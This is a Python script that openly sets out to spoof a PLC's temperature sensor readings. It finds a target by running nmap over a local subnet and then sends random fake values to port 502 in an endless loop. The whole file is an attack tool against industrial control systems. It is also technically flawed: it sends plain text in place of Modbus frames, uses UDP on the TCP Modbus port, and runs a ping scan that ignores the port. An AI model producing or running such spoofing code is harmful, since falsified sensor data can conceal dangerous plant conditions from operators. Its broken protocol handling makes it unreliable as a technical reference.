import socket
import struct
import random
import time
import subprocess

# Configuration -  These should be customized for your specific setup
PLC_TAG_TO_SPOOF = "TemperatureSensor1.Value"  # Example: Change to the actual PLC tag
REPORTING_MESSAGE_FORMAT = "float"  # Example: Could be "int", "float", etc. Adjust as needed.
SPOOFED_VALUE_RANGE = (20, 30)   # Example:  Min and Max spoofed values (inclusive) for temperature.
SPOOFING_INTERVAL_SEC = 2     # Time in seconds between sending spoofed messages.
UDP_PORT = 502  # Common Modbus TCP port, adjust if different.
MAX_TRIES = 3 # Amount of tries to get the ip address before failing
    
def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the network.
    This is a simplified example and might need to be adapted for your
    specific network environment.  It relies on `nmap` being installed
    and accessible in the system's PATH.

    Returns:
        str: The PLC's IP address if found, otherwise None.
    """
    try:
        # Execute nmap to scan the network for devices with open Modbus ports (e.g., 502)
        # Adjust the network range (192.168.1.0/24) to match your local network
        # The '-sn' option performs a ping scan (host discovery)
        # The '-p 502' option specifies port 502 (Modbus)
        print("Attempting to discover PLC IP address using nmap...")
        result = subprocess.run(['nmap', '-sn', '192.168.1.0/24', '-p', str(UDP_PORT)], capture_output=True, text=True, check=True)
        output = result.stdout

        # Parse the nmap output to find the IP address
        for line in output.splitlines():
            if "Nmap scan report for" in line:
                ip_address = line.split("for ")[1].strip()
                print(f"Found potential PLC IP: {ip_address}")
                return ip_address

        print("No PLC IP address found in nmap output.")
        return None  # PLC not found

    except FileNotFoundError:
        print("Error: nmap not found.  Please install nmap and ensure it's in your system's PATH.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        print(f"nmap output: {e.stderr}") #Useful for debugging nmap problems
        return None
    except Exception as e:
        print(f"An unexpected error occurred during PLC IP discovery: {e}")
        return None


def create_spoofed_message(plc_ip, tag_name, value_format, spoofed_value):
    """
    Creates a spoofed reporting message to mimic the PLC's communication.

    Args:
        plc_ip (str): The IP address of the PLC.
        tag_name (str): The name of the PLC tag being spoofed.
        value_format (str):  The data type format ("int", "float", etc.).
        spoofed_value (float or int):  The spoofed value to insert.

    Returns:
        bytes: The spoofed message as a byte string.  This example uses a *very* simplified
               message structure, which you will almost certainly need to adapt.
    """

    # This is a placeholder message format.  A REAL control system
    # will have a much more complex, proprietary format that you must
    # reverse engineer from network captures of legitimate communication.

    message = f"Spoofed data from {tag_name} at {plc_ip}: {spoofed_value}"
    return message.encode('utf-8')  #Encode into bytes

def send_spoofed_message(plc_ip, udp_port, message):
    """
    Sends the spoofed message to the PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        udp_port (int): The UDP port the PLC is listening on.
        message (bytes): The spoofed message as a byte string.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Use UDP for mimicking reporting

        sock.sendto(message, (plc_ip, udp_port))
        print(f"Spoofed message sent to {plc_ip}:{udp_port}: {message}")
    except Exception as e:
        print(f"Error sending spoofed message: {e}")


def main():
    """
    Main function to continuously spoof reporting messages.
    """
    plc_ip = None
    tries = 0
    while plc_ip is None and tries < MAX_TRIES:
      plc_ip = find_plc_ip()
      tries += 1
      if plc_ip is None:
        print(f"PLC IP not found, retrying {tries}/{MAX_TRIES}")
        time.sleep(5)
    if plc_ip is None:
        print("Failed to find PLC IP address after multiple attempts. Exiting.")
        return
    
    print(f"Using PLC IP: {plc_ip}")
    try:
        while True:
            # Generate a random value within the specified range
            if REPORTING_MESSAGE_FORMAT == "float":
                spoofed_value = random.uniform(SPOOFED_VALUE_RANGE[0], SPOOFED_VALUE_RANGE[1])
            elif REPORTING_MESSAGE_FORMAT == "int":
                spoofed_value = random.randint(SPOOFED_VALUE_RANGE[0], SPOOFED_VALUE_RANGE[1])
            else:
                print("Unsupported REPORTING_MESSAGE_FORMAT.  Using integer format.")
                spoofed_value = random.randint(SPOOFED_VALUE_RANGE[0], SPOOFED_VALUE_RANGE[1])

            # Create the spoofed message
            spoofed_message = create_spoofed_message(plc_ip, PLC_TAG_TO_SPOOF, REPORTING_MESSAGE_FORMAT, spoofed_value)

            # Send the spoofed message
            send_spoofed_message(plc_ip, UDP_PORT, spoofed_message)

            # Wait before sending the next spoofed message
            time.sleep(SPOOFING_INTERVAL_SEC)

    except KeyboardInterrupt:
        print("Script interrupted. Exiting.")

if __name__ == "__main__":
    main()